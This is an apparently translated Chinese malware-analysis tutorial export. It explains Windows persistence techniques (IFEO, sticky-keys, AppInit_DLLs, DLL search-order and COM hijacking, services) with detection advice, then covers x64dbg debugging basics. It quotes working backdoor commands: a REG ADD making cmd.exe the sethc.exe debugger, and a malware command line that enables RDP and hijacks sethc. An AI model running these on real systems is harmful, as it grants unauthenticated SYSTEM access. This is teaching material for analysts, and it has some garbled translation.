NT\\CurrentVersion\\Winlogon\\Shell在下面的例子中，Brontok蠕虫通过用其恶意的可执行文件修改下列Winlogon注册表值来实现持久性。\n为了检测这种类型的持久性机制，可以使用Sysinternals Autoruns工具。如前所述，你可以监测注册表中的可疑条目（与合法程序无关）。\n2.5 IFEO 图像文件执行选项 (Image File Execution Options) 图像文件执行选项（IFEO）允许人们在调试器下直接启动一个可执行文件。它使开发者可以选择调试他们的软件，以调查可执行文件启动代码中的问题。开发者可以在以下注册表键下用他/她的可执行文件的名称创建一个子键，并将调试器的值设置为调试器的路径。\nKey: \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\\u003cexecutable name\u003e\" Value: Debugger : REG_SZ : \u003cfull-path to the debugger\u003e进攻者利用这个注册表键来启动他们的恶意程序。为了演示这种技术，通过添加以下注册表项，将notepad.exe的调试器设置为计算器（calc.exe）进程。\n现在，当你启动记事本时，它将被一个计算器程序启动（尽管它不是一个调试器）。这种行为可以在下面的屏幕截图中看到。\n下面是一个恶意软件样本（TrojanSpy:Win32/Small.M）的例子，它将其恶意程序iexplor.exe配置为Internet的调试器 explorer, (iexplore.exe)。这是通过添加以下注册表值实现的。在这种情况下，攻击者选择了一个看起来与合法的internet explorer可执行文件名相似的文件名。由于以下注册表项的存在，每当合法的internet explorer（iexplore.exe）被执行时，它就会被恶意程序iexplor.exe启动，从而执行恶意代码。\n[RegSetValue] LSASSMGR.EXE:960 \u003e HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\iexplore.exe\\Debugger = C:\\Program Files\\Internet Explorer\\iexplor.exe为了检测这种类型的持久性技术，你可以检查图像文件执行选项注册表项，看是否有与合法程序无关的修改。\n2.6 无障碍项目 Windows操作系统提供了各种无障碍功能，如屏幕键盘、叙述者、放大镜、语音识别等。这些功能主要是为有特殊需要的人设计的。这些无障碍程序甚至不用登录系统就可以启动。例如，许多这些辅助功能程序可以通过按下Windows+U组合键来访问，从而启动C:\\Windows\\System32\\utilman.exe，或者你可以通过按五次shift键来启用粘性键，这将启动程序C:\\Windows\\System32\\sethc.exe。攻击者可以改变这些无障碍程序（如sethc.exe和utilman.exe）的启动方式，以执行他们选择的程序，或者他们可以使用cmd.exe来提升权限（权限升级）。\n攻击者利用粘性密钥（sethc.exe）功能，通过远程桌面（RDP）获得未经认证的访问。 远程桌面（RDP）。在Hikit Rootkit的案例中，（https://www.fireeye.com/blog/ threat-research/2012/08/hikit-rootkit-advanced-persistent-attack-techniques-part-1.html）合法的sethc.exe程序被替换成cmd.exe。这使得攻击者只需按五次shift键，就可以通过RDP以系统权限访问命令提示符。虽然在旧版本的Windows中，可以用另一个程序替换无障碍程序，但新版本的Windows执行了各种限制，如被替换的二进制文件必须位于%systemdir%，需要对x64系统进行数字签名，并且必须受Windows文件或资源保护（WFP/WRP）保护。这些限制使得对手很难替换合法程序（如sethc.exe）。为了避免替换文件，敌方利用了图像文件执行选项（在上一节中涉及）。下面的注册表项将cmd.exe设置为sethc.exe的调试器；现在，对手可以使用RDP登录并按五次Shift键以获得对系统级命令外壳的访问。使用这个外壳，对手甚至可以在认证之前执行任何任意的命令。以同样的方式，一个恶意的后门程序可以通过设置为sethc.exe或utilman.exe的调试器来执行。\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f在下面的例子中，当恶意软件样本（mets.exe）被执行时，它会运行以下命令，修改防火墙规则/注册表以允许RDP连接，然后添加一个注册表值，将任务管理器（taskmgr.exe）设为sethc.exe的调试器。这允许对手通过RDP访问taskmgr.exe（具有系统权限）。使用这种技术，对手可以通过RDP杀死一个进程或启动/停止一个服务，甚至不需要登录到系统中。\n[CreateProcess] mets.exe:564 \u003e \"cmd /c netsh firewall add portopening tcp 3389 all \u0026 reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f \u0026 REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe /v Debugger /t REG_SZ /d %windir%\\system32\\taskmgr.exe /f\"这种类型的攻击略微难以发现，因为攻击者要么用合法程序替换无障碍程序，要么利用合法程序。然而，如果你怀疑无障碍程序（sethc.exe）已被合法文件（如 cmd.exe 或 taskmgr.exe）取代，那么你可以将被取代的无障碍程序的哈希值与合法文件（cmd.exe 或 taskmgr.exe）的哈希值进行比较，以寻找匹配。哈希值匹配表明原始的 sethc.exe 文件被替换。你还可以检查图像文件执行选项的注册表项，看是否有任何可疑的修改。\n2.7 启用的应用程序的DLLs(AppInit_DLLs) Windows中的AppInit_DLLs功能提供了一种将自定义DLLs加载到每个交互式应用程序的地址空间的方法。一旦DLL被加载到任何进程的地址空间，它就可以在该进程的上下文中运行，并可以钩住知名的API来实现一个替代功能。攻击者可以通过在以下注册表键中设置AppInit_DLLs值来实现其恶意DLL的持久性。这个值通常包含空格或以逗号分隔的DLLs列表。这里指定的所有DLLs都被加载到每个加载User32.dll的进程中。由于User32.dll几乎被所有进程加载，这种技术使攻击者能够将他们的恶意DLL加载到大多数进程中，并在加载进程的上下文中执行恶意代码。除了设置AppInit_DLLs值，攻击者还可以通过将LoadAppInit_DLLs注册表值设置为1来启用AppInit_DLLs功能。在启用安全启动的Windows 8和更高版本中，AppInit_DLLs功能被禁用。\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows以下截图显示了由T9000后门（https://researchcenter.paloaltonetworks.com/2016/02/t9000-advanced-modular- backdoor-uses-complex-anti-analysis-techniques/）添加的AppInit DLL条目。\n由于添加了前面的注册表项，当任何新进程（加载User32.dll）启动时，都会将恶意DLL（ResN32.dll）加载到其地址空间。下面的截图显示了重启系统后加载恶意DLL（ResN32.dll）的操作系统的进程。由于这些进程大多以高完整性级别运行，它允许对手以高权限执行恶意代码。\n为了检测这种技术，你可以寻找在 AppInit_DLLs注册表的可疑条目，这些条目与你环境中的合法程序无关。你还可以寻找任何由于加载恶意DLL而表现出异常行为的进程。\n2.8 DLL搜索顺序劫持 当一个进程被执行时，其相关的DLL被加载到进程内存中（通过导入表或作为进程调用LoadLibrary() API的结果）。Windows操作系统在预定义的位置上以特定的顺序搜索要加载的DLL。搜索顺序在MSDN这里有记录：http:// msdn.microsoft.com/en-us/library/ms682586（VS.85）.aspx。\n简而言之，如果任何DLL必须被加载，操作系统首先检查DLL是否已经在内存中加载。如果是，它就会使用加载的DLL。如果没有，它就检查该DLL是否被定义在KnownDLLs注册表键（HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs）。这里列出的DLLs是系统DLLs（位于system32目录下），它们使用Windows文件保护，以确保这些DLLs不会被删除或更新，除非被操作系统更新。如果要加载的DLL在KnownDLLs列表中，那么该DLL总是从System32目录中加载。如果不满足这些条件，那么操作系统会按顺序在以下位置寻找DLL。\n启动该应用程序的目录。 系统目录（C:\\Windows\\System32）。 16位系统目录（C:\\Windows\\System）。 Windows目录(C:\\Windows)。 当前目录。 在PATH变量中定义的目录。 攻击者可以利用操作系统搜索DLL的方式来提升权限并实现持久性。考虑一下Operation Groundbait（http://www.welivesecurity.com/wp-content/uploads/ 2016/05/Operation-Groundbait.pdf）中使用的恶意软件（Prikormka dropper）。该恶意软件在执行时，会在Windows目录（C:\\Windows）中投放一个名为samlib.dll的恶意DLL，如下所示。\n[CreateFile] toor.exe:4068 \u003e %WinDir%\\samlib.dll在一个干净的操作系统中，一个具有相同名称的DLL（samlib.dll）驻留在C:\\Windows\\System32目录中，这个干净的DLL被驻留在C:\\Windows目录中的explorer.exe加载。这个干净的DLL也被驻扎在system32目录下的其他几个进程加载，如图所示。\n由于恶意DLL与explorer.exe被丢在同一目录下（即C:\\Windows），因此，当系统重新启动时，恶意的samlib.dll被explorer.exe从C:\\Windows目录中加载，而不是从system32目录中加载合法的DLL。下面的截图是在重新启动受感染的系统后拍摄的，显示了由于DLL搜索顺序被劫持而被explorer.exe加载的恶意DLL。\nDLL搜索顺序劫持技术使取证分析变得更加困难，并逃避了传统的防御措施。为了检测这种攻击，你应该考虑监控DLLs的创建、重命名、替换或删除，并寻找任何由进程从异常路径加载的模块（DLLs）。\n2.9 COM劫持 组件对象模型（COM）是一个系统，它允许软件组件之间进行交互和通信，即使它们对对方的代码一无所知（https://msdn.microsoft.com/en-us/library/ms694363(v=vs.85).aspx）。软件组件通过使用COM对象进行交互，这些对象可以在单个进程、其他进程或远程计算机上。COM是作为一个客户/服务器框架来实现的。一个COM客户端是一个使用来自COM服务器（COM对象）的服务的程序，而COM服务器是一个向COM客户端提供服务的对象。COM服务器在DLL（称为进程内服务器）或EXE（称为进程外服务器）中实现一个由各种方法（功能）组成的接口。一个COM客户可以利用COM服务器提供的服务，方法是创建一个COM对象的实例，获取接口的指针，并调用其接口中实现的方法。\nWindows操作系统提供了各种COM对象，可供程序（COM客户端）使用。这些COM对象由一个独特的数字标识，称为类标识符（CLSIDs），它们通常在注册表键HKEY_CLASSES_ROOT\\CLSID\u003c唯一的clsid\u003e中找到。例如，“我的电脑 “的COM对象是{20d04fe0-3aea-1069-a2d8-08002b30309d}，在下面的截图中可以看到。\n对于每个CLSID键，你还有一个叫做InProcServer32的子键，指定实现COM服务器功能的DLL的文件名。下面的截图告诉你shell32.dll（COM服务器）与我的电脑有关。\n与 “我的电脑 “COM对象类似，微软提供了各种其他的COM对象（在DLL中实现），供合法程序使用。当合法程序（COM客户端）使用特定COM对象（使用其CLSID）的服务时，其相关的DLL被加载到客户端程序的进程地址空间。在COM劫持的情况下，攻击者修改了合法COM对象的注册表项，并将其与攻击者的恶意DLL联系起来。其想法是，当合法程序使用被劫持的对象时，恶意DLL会被加载到合法程序的地址空间。这使得对手能够在系统上持续存在并执行恶意代码。\n在下面的例子中，在执行该恶意软件（Trojan.Compfun）时，它掉落了一个扩展名为._dl的dll，如下所示。\n[CreateFile] ions.exe:2232 \u003e %WinDir%\\system\\api-ms-win-downlevel-qgwo- l1-1-0._dl然后，该恶意软件在HKCU\\Software\\Classes\\CLSID中设置了以下注册表值。这个条目将MMDeviceEnumerator类的COM对象{BCDE0395-E52F-467C-8E3D-C4579291692E}与当前用户的恶意DLL C:\\Windows\\system\\api-ms- win-downlevel-qgwo-l1-0._dl相关联。\n[RegSetValue] ions.exe:2232 \u003e HKCU\\Software\\Classes\\CLSID\\{BCDE0395- E52F-467C-8E3D-C4579291692E}\\InprocServer32\\(Default) = C:\\Windows\\system\\api-ms-win-downlevel-qgwo-l1-1-0._dl在一个干净的系统中，MMDeviceEnumerator类的COM对象{BCDE0395-E52F-467C-8E3D-C4579291692E}与DLL MMDevApi.dll相关，其注册表项通常在HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\中找到，而在HKCU\\Software\\Classes\\CLSID\\中没有找到相应条目。\n由于恶意软件在HKCU\\Software\\Classes\\CLSID{BCDE0395-E52F-467C-8E3D-C4579291692E}中添加了一个条目，受感染的系统现在包含两个相同CLSID的注册表项。由于HKCU\\Software\\Classes\\CLSID{BCDE0395-E52F-467C-8E3D- C4579291692E}的用户对象在位于HKLM\\SOFTWARE\\Classes\\CLSID{BCDE0395-E52F-467C-8E3D-C4579291692E}的机器对象之前被加载，恶意DLL被加载，从而劫持了MMDeviceEnumerator的COM对象。现在，任何使用MMDeviceEnumerator对象的进程都会加载恶意的DLL。下面的截图是在重新启动受感染的系统后拍摄的。重启后，恶意的DLL被explorer.exe加载，如图所示。\nCOM劫持技术逃避了大多数传统工具的检测。为了检测这种攻击，你可以在HKCU\\Software\\Classes\\CLSID\\中寻找对象的存在。恶意软件可能不会在HKCU\\Software\\Classes\\CLSID\\中添加条目，而是修改HKLM\\Software\\Classes\\CLSID\\中的现有条目以指向一个恶意二进制文件，因此你也应该考虑检查这个注册表键中指向未知二进制文件的任何值。\n2.10 服务 服务是一个在后台运行的程序，没有任何用户界面，它提供操作系统的核心功能，如事件记录、打印、错误报告等。拥有管理员权限的对手可以通过将恶意程序安装为服务或修改现有的服务而在系统上持续存在。对于攻击者来说，使用服务的好处是，它可以被设置为在操作系统启动时自动启动，而且它大多以SYSTEM这样的特权账户运行；这使得攻击者可以提升权限。攻击者可以将恶意程序实现为EXE、DLL或内核驱动，并作为服务运行。Windows支持各种服务类型，下面概述了恶意程序使用的一些常见服务类型。\nWin32OwnProcess。服务的代码以可执行文件的形式实现，它作为一个单独的进程运行。 Win32ShareProcess。服务的代码以DLL的形式实现，它从一个共享主机进程（svchost.exe）中运行。 内核驱动服务。这种类型的服务在一个驱动程序（.sys）中实现，它被用来在内核空间执行代码。 Windows在注册表的HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSetservices键下存储已安装的服务列表及其配置。每个服务都有自己的子键，由指定服务如何、何时以及是否在EXE、DLL或内核驱动中实现的值组成。例如，Windows安装程序服务的名称是msiserver，在下面的截图中，HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services下有一个与服务名称相同的子键。ImagePath值指定这个服务的代码在msiexec.exe中实现，Type值为0x10(16)告诉我们它是Win32OwnProcess，Start值0x3代表SERVICE_DEMAND_START，这意味着这个服务需要手动启动。\n要确定与常量值相关的符号名称，你可以参考MSDN的CreateService() API文档（https://msdn.microsoft.com/en- us/library/windows/desktop/ms682450(v=vs.85).aspx），或者你可以通过提供服务名称使用sc工具查询服务配置，如下图所示。这将显示在注册表子键中发现的类似信息。\nC:\\\u003esc qc \"msiserver\" [SC] QueryServiceConfig SUCCESS SERVICE_NAME: msiserver TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 3 DEMAND_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\Windows\\system32\\msiexec.exe /V LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Windows Installer DEPENDENCIES : rpcss SERVICE_START_NAME : LocalSystem现在让我们看一下Win32ShareProcess服务的例子。Dnsclient服务的服务名称是Dnscache，服务的代码是在DLL中实现的。当一个服务被实现为DLL（服务DLL）时，ImagePath注册表值通常会包含svchost.exe的路径（因为那是加载服务DLL的进程）。要确定与服务相关的DLL，你将不得不查看ServiceDLL值，它存在于 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\u003cservice name\u003e\\Parameters子键下。下面的截图显示了与Dnsclient服务相关的DLL（dnsrslvr.dll）；这个DLL被通用主机进程svchost.exe加载。\n攻击者可以通过许多方式创建服务。下面概述了一些常见的方法。\nsc工具。恶意软件可以调用cmd.exe，并可能运行sc命令，如sc创建和sc启动（或net启动），分别创建和启动服务。在下面的例子中，恶意软件执行sc命令（通过cmd.exe）来创建和启动一个名为update的服务。\n[CreateProcess] update.exe:3948 \u003e \"%WinDir%\\System32\\cmd.exe /c sc create update binPath= C:\\malware\\update.exe start= auto \u0026\u0026 sc start update \" 批量脚本。恶意软件可以投放一个批处理脚本，并执行前面提到的命令来创建和启动服务。在下面的例子中，恶意软件（Trojan:Win32/Skeeyah）投放了一个批处理脚本（SACI_W732.bat）并执行批处理脚本（通过cmd.exe），这反过来又创建并启动了一个名为Saci的服务。\n[CreateProcess] W732.exe:2836 \u003e \"%WinDir%\\system32\\cmd.exe /c %LocalAppData%\\Temp\\6DF8.tmp\\SACI_W732.bat \" [CreateProcess] cmd.exe:2832 \u003e \"sc create Saci binPath= %WinDir%\\System32\\Saci.exe type= own start= auto\" [CreateProcess] cmd.exe:2832 \u003e \"sc start Saci\" Windows API。恶意软件可以使用Windows API，如CreateService()和StartService()来创建和启动服务。当你在后台运行sc 工具在后台运行时，它使用这些API调用来创建和启动服务。考虑一下下面这个NetTraveler恶意软件的例子。执行时，它首先丢弃一个dll。\n[CreateFile] d3a.exe:2904 \u003e %WinDir%\\System32\\FastUserSwitchingCompatibilityex.dll 然后，它使用OpenScManager()API打开一个服务控制管理器的句柄，并通过调用CreateService()API创建一个Win32ShareProcess类型的服务。第二个参数指定了服务的名称，在本例中是FastUserSwitchingCompatiblity。\n在调用CreateService()后，服务被创建，以下注册表键被添加到服务配置信息中。\n然后，它在上一步创建的注册表键下创建一个参数子键。\n之后，它丢弃并执行一个批处理脚本，设置注册表值（ServiceDll），将DLL与创建的服务联系起来。批处理脚本的内容在这里显示。\n@echo off @reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\FastUserSwitchingComp atibility\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d C:\\Windows\\system32\\FastUserSwitchingCompatibilityex.dll由于创建了Win32ShareProcess服务，当系统启动时，服务控制管理器（services.exe）会启动svchost.exe进程，该进程又会加载恶意的ServiceDLL FastUserSwitchingCompatibilityex.dll。\nPowerShell和WMI：也可以使用管理工具创建服务，如PowerShell（https://docs.microsoft.com/en-us/powershell/module/ microsoft.powershell.management/new-service?view=powershell-5.1）和Window Management Instrumentation（WMI）高级接口（https://msdn. microsoft.com/en-us/library/aa394418（v=vs.85）.aspx）。 攻击者可以修改（劫持）现有的服务，而不是创建一个新的服务。通常情况下，攻击者会劫持一个未使用或禁用的服务。这使得检测变得稍微困难，因为如果你试图找到非标准或未被识别的服务，你将错过这种类型的攻击。考虑一下BlackEnergy恶意软件投放器的例子，它劫持了现有的服务以在系统上持续存在。在执行时，BlackEnergy用恶意的aliide.sys驱动替换了驻留在system32\\drivers目录下的名为aliide.sys的合法驱动（与名为aliide的服务相关）。替换驱动程序后，它修改了与aliide服务相关的注册表项，并将其设置为自动启动（当系统启动时，该服务自动启动），如以下事件所示。\n[CreateFile] big.exe:4004 \u003e %WinDir%\\System32\\drivers\\aliide.sys [RegSetValue] services.exe:504 \u003e HKLM\\System\\CurrentControlSet\\services\\aliide\\Start = 2下面的截图显示了修改前后aliide服务的服务配置。关于BlackEnergy3 big dropper的详细分析，请阅读作者的博文：https://cysinfo.com/blackout-memory-analysis-of-blackenergy- big-ropper/。\n为了检测此类攻击，请监测与合法程序无关的服务注册表项的变化。寻找与服务相关的二进制路径的修改，以及服务启动类型的变化（从手动到自动）。你还应该考虑监控和记录sc、PowerShell和WMI等工具的使用情况，这些工具可用于与服务互动。Sysinternals AutoRuns工具也可以用来检查服务的使用情况，以实现持久性。\n只要微软Office应用程序启动，敌方就可以持续并执行DLL中的恶意代码。更多细节，请参见http://www.hexacorn.com/blog/2014/04/16/beyond-good-ol-run-key- part-10/ 和 https://researchcenter.paloaltonetworks.com/2016/ 07/unit42-technical-walkthrough-offic-test-persistence-method- used-in-recent-sofacy-attacks/。 关于各种持久化方法的进一步细节，以及了解对手的战术和技术，请参考MITRE的ATT\u0026CK维基：https:/ /attack.mitre.org/wiki/persistence。\n总结 恶意软件使用各种API调用与系统进行交互，在这一章中，你了解到恶意二进制文件是如何使用API调用来实现各种功能的。本章还介绍了对手使用的不同的持久性技术，这些技术使它们即使在系统重启后也能驻留在受害者的系统中（其中一些技术允许恶意二进制软件以高权限执行代码）。 在下一章中，你将了解对手使用的不同的代码注入技术，在合法进程的上下文中执行他们的恶意代码。\n",
    "description": "",
    "tags": "恶意样本分析,学习",
    "title": "恶意样本分析-8-恶意软件的功能和持久化",
    "uri": "/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-8-%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%8A%9F%E8%83%BD%E5%92%8C%E6%8C%81%E4%B9%85%E5%8C%96/index.html"
  },
  {
    "content": "6. 调试恶意软件二进制文件 调试时一个通过受控方式执行恶意代码的技术。Debugger是一个程序，使你可以在更细颗粒度的级别上检查恶意代码。debugger提供了对恶意软件运行时行为的完全控制，并允许控制执行单个或多个指令，也可以选择功能执行程序的（而不是执行整个程序），同时研究恶意软件的每个行动。\n在本章中，你将主要学习IDA Pro（商业反汇编/调试器）和x64dbg（开源x32/x64调试器）提供的调试特性。你将在本章了解这些调试器提供的特性，以及如何使用他们检查程序的运行时行为。根据可用资源的不同，可以自由选择这两个调试器中的一个活两个来调试恶意二进制文件。当调试恶意软件时，需要采取适当措施，因为您将在系统上运行恶意代码。在本章最后，还有如何使用.net反编译器/调试器dnSpy（https://github.com/0xd4d/dnSpy)来调试.net应用程序。\n其他受欢迎的反汇编器/调试器包括radare2 (http://rada.re/r/index.html),调试工具的WinDbg部分为Windows (https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/), Ollydbg (http://www.ollydbg.de/version2.html),免疫调试器(https://www.immunityinc.com/products/debugger/),Hopper (https://www.hopperapp.com/)和Binary Ninja (https://binary.ninja/)。\n1. 通用调试内容 在我们深入研究这些调试器（IDA Pro、x64dbg和DnSpy）提供的特性之前，有必要了解大多数调试器提供的一些常见特性。在本节中，您将主要看到通用的调试概念，在接下来的小节中，我们将重点介绍IDA Pro、x64dbg和dnSpy的基本特性。\n1.1 启动和附加到进程 调试通常选择要调试的程序。有两种方法调试程序： （a）将调试器附加到一个正在运行的进程上， （b）启动一个新的进程。当您将调试器附加到正在运行的进程时，你讲无法控制或者监视程序的初始操作，因为当你有机会附加到进程时，它的所有启动和初始化代码都已经执行了。当您将调试器附加到某个进程时，调试器将刮起该进程，使您有机会在恢复进程之前检查进程的资源或设置断点。\n另一方面，启动一个新进程允许你监视或调试流程采取的每个操作，您还将能够监视流程的初始操作。当你启动调试器时，原始二进制文件将以调试器的用户权限执行。当进程在调试器下启动时，执行将在程序的入口暂停。程序的入口点事将要执行的第一条指令的地址。子啊后面的小节中，将学习如何使用IDApro、x64dbg和dnspy启动并附加到 进程。程序的日寇点不一定是main或winmain函数；在将控制转移到main或winmain之前，执行初始化例程（启动历程）。启动历程的目的是在将控制传递给朱函数之前初始化程序的环境。这个初始化被调试器指定为程序的入口点。\n程序的入口不一定是main或WinMain函数;在将控制转移到main或WinMain之前，初始化程序(启动程序)被执行。启动例程的目的是在将控制传递给主函数之前初始化程序环境。这个初始化被调试器指定为程序的入口点。\n1.2 控制进程执行 调试器使您能够在进程执行时控制/修改进程的行为。调试器提供的两个重要功能是:(a)控制执行的能力，(b)中断执行的能力(使用断点)。使用调试器，您可以在将控制权返回给调试器之前执行一个或多个指令(或选择函数)。在分析过程中，您将结合调试器的受控执行和中断(断点)特性来监视恶意软件的行为。在本节中，您将了解调试器提供的常用执行控制功能;在后面的章节中，您将学习如何在IDA Pro、x64dbg和dnSpy中使用这些特性。\n下面是调试器提供的一些常见的执行控制选项:\n继续（运行）。 这将执行所有的指令，直到达到一个断点或发生一个异常。当你把一个恶意软件加载到调试器中，并在没有设置断点的情况下使用继续（运行）选项时，它将执行所有的指令而不给你任何控制权；所以，你通常将这个选项和断点一起使用，在断点位置中断程序。\n步入和跨步。 使用Step into和Step over，你可以执行一条指令。在执行完单条指令后，调试器停止，给你一个机会检查进程的资源。当您执行一条调用函数的指令时，步入和跨步的区别就出现了。例如，在下面的代码中，在➊，有一个对函数sub_401000的调用。当你对这条指令使用step into选项时，调试器将在函数的开始处（地址为0x401000）停止，而当你使用step over时，整个函数将被执行，调试器将在下一条指令➋（即地址为0x00401018）暂停。你通常会使用step into来进入一个函数内部，以了解它的内部工作原理。当你已经知道一个函数的作用（例如在API函数中）并希望跳过它时，就会使用Step over。\n.text:00401010 push ebp .text:00401011 mov ebp, esp .text:00401013 call sub_401000 ➊ .text:00401018 xor eax,eax ➋ Execute till Return（运行至返回）。 这个选项允许你执行当前函数中的所有指令，直到它返回。如果你不小心进入了一个函数（或进入了一个不感兴趣的函数），并希望从里面出来，这就很有用。在一个函数中使用这个选项会把你带到函数的末端（ret或retn），之后你可以使用step into或step over选项返回到调用的函数。 Run to cursor 运行到光标（运行到选择）。 这允许你执行指令直到当前的光标位置，或者直到到达所选指令。 1.3 用断点中断程序 断点是调试器的一项功能，它允许你在程序中一个非常具体的位置中断程序的执行。断点可以用来暂停某条指令的执行，或者当程序调用某个函数/API函数时，或者当程序从某个内存地址读、写或执行时。你可以在一个程序中设置多个断点，当到达任何一个断点时，程序的执行将被中断。一旦达到一个断点，就有可能监测/修改程序的各个方面。调试器通常允许你设置不同类型的中断点。\n软件断点。 默认情况下，调试器会使用软件断点。软件断点的实现是用一条软件断点指令替换断点地址的指令，如int 3指令（操作码为0xCC）。当软件断点指令（如int 3）被执行时，控制权被转移到调试器上，调试器正在调试被中断的进程。使用软件断点的好处是，你可以设置无限数量的断点。缺点是，恶意软件可以寻找断点指令（int 3），并修改它来改变所附调试器的正常操作。 硬件断点。CPU，如x86，通过使用CPU的调试寄存器DR0-DR7，支持硬件断点。你可以使用DR0-DR3设置最多四个硬件断点；其他剩余的调试寄存器用于指定每个断点的附加条件。在硬件断点的情况下，没有指令被替换，但是CPU会根据调试寄存器中的数值决定程序是否应该被中断。 内存断点。 这些断点允许你在一条指令访问（读出或写入）内存时暂停执行，而不是暂停执行。如果你想知道某条内存何时被访问（读或写），并想知道哪条指令访问了它，这就很有用。例如，如果你在内存中发现一个有趣的字符串或数据，你可以在该地址上设置一个内存断点，以确定在什么情况下访问该内存。条件性断点。 使用条件性断点，您可以指定必须满足的条件来触发断点。如果达到了条件性断点但条件没有得到满足，调试器会自动恢复程序的执行。条件性断点不是指令的特性，也不是CPU的特性，而是调试器提供的一种功能。因此，您可以为软件和硬件断点指定条件。当条件断点被设置后，调试器的责任是评估条件表达式，并确定程序是否需要中断。 1.4 追踪程序的执行 追踪是一种调试功能，它允许你在进程执行时记录（日志）特定的事件。追踪给你提供二进制文件的详细执行信息。在后面的章节中，你将了解IDA和x64dbg所提供的不同类型的跟踪功能。\n2. 使用x64dbg调试二进制文件 x64dbg（https://x64dbg.com）是一个开源的调试器。你可以使用x64dbg来调试32位和64位应用程序。它有一个易于使用的GUI，并提供各种调试功能（https://x64dbg.com/#features）。在本节中，你将看到x64dbg提供的一些调试功能，以及如何使用它来调试一个恶意的二进制文件。\n2.1 在x64dbg中启动一个新进程 在x64dbg中，要加载一个可执行文件，选择文件|打开，并浏览到你想调试的文件；这将启动该进程，调试器将在系统断点、TLS回调或程序入口点函数处暂停，这取决于配置设置。你可以通过选择选项|首选项|事件来访问设置对话框。默认的设置对话框显示如下，可执行文件被加载时的默认设置。调试器首先在系统函数中中断（因为系统断点选项被选中）。接下来，在你运行调试器后，它将在TLS回调函数处暂停，如果存在的话（因为TLS回调选项被选中）。这有时是有用的，因为一些反调试器的技巧包含TLS条目，允许恶意软件在主程序运行前执行代码。如果你进一步执行该程序，执行会在程序的入口处暂停。\n编辑百度：TLS回调函数是指，每当创建/终止进程的线程时会自动调用执行的函数。创建的主线程也会自动调用回调函数，且其调用执行先于EP代码。\n如果你想让执行直接在程序的入口处暂停，那么请取消勾选系统断点和TLS回调选项（这种配置对大多数恶意软件程序来说应该是很好的，除非恶意软件使用反调试技巧）。要保存配置设置，只需点击保存按钮。有了这个配置，当可执行文件被加载时，进程就会开始，并在程序的进入点暂停执行，如图所示。\n2.2 附属于一个现有的进程 要在x64dbg中附加到一个现有的进程，选择文件|附加（或Alt + A）；这将出现一个显示运行进程的对话框，如下所示。选择你想调试的进程，然后点击附加按钮。当调试器被附加时，进程被暂停，给你时间设置断点和检查进程的资源。当您关闭调试器时，附加的进程将终止。如果您不希望所连接的进程终止，您可以通过选择文件|分离（Ctrl + Alt + F2）来分离一个进程；这可以确保在您关闭调试器时，所连接的进程不会被终止。\n有时，当您尝试将调试器附加到一个进程时，您会发现并非所有的进程都列在对话框中。在这种情况下，请确保你是以管理员身份运行调试器；你需要通过选择 “选项”|“偏好”，并在 “引擎 “选项卡中勾选 “启用调试权限”，来启用调试权限设置。\n2.3 x64dbg调试器接口 当你在x64dbg中加载一个程序时，你会看到一个调试器显示屏，如下图所示。调试器显示包含多个标签；每个标签显示不同的窗口。每个窗口都包含关于被调试二进制文件的不同信息。\n反汇编窗口（CPU窗口）。它显示了被调试程序的所有指令的反汇编情况。这个窗口以线性方式显示反汇编，并与指令指针寄存器（eip或rip）的当前值同步。这个窗口的左边部分显示一个箭头，表示程序的非线性流程（如分支或循环）。你可以通过按G热键来显示控制流图。控制图显示如下；条件性跳转使用绿色和红色箭头。绿色箭头表示如果条件为真将进行跳跃，红色箭头表示不进行跳跃。蓝色箭头用于无条件跳转，向上（向后）的蓝色箭头表示一个循环。\n寄存器窗口。 这个窗口显示CPU寄存器的当前状态。通过双击寄存器并输入一个新的数值，可以修改寄存器中的数值（你也可以右击并修改寄存器的数值为零或增加/减少寄存器的数值）。你可以通过双击标志位的值来切换标志位的开或关。你不能改变指令指针（eip或rip）的值。当你调试程序时，寄存器的值会发生变化；调试器会用红色突出显示寄存器的值，以表示自上一条指令以来的变化。\n堆栈窗口。 堆栈视图显示进程的运行时堆栈的数据内容。在恶意软件分析过程中，你通常会在调用一个函数之前检查堆栈，以确定传递给函数的参数数量和函数参数的类型（如整数或字符指针）。\n转储窗口。 它显示内存的标准十六进制转储。你可以使用转储窗口来检查被调试进程中任何有效内存地址的内容。例如，如果一个堆栈位置、寄存器或指令包含一个有效的内存位置，要检查该内存位置，右击该地址并选择在转储中关注选项。\n内存地图窗口。 你可以点击Memory Map标签来显示Memory Map窗口的内容。这提供了进程内存的布局，并为你提供了进程中分配的内存段的细节。它是查看可执行文件及其部分在内存中的加载位置的一个好方法。这个窗口还包含关于进程中的DLLs及其在内存中的部分的信息。你可以双击任何条目来重新定位显示到相应的内存位置。\n符号窗口。 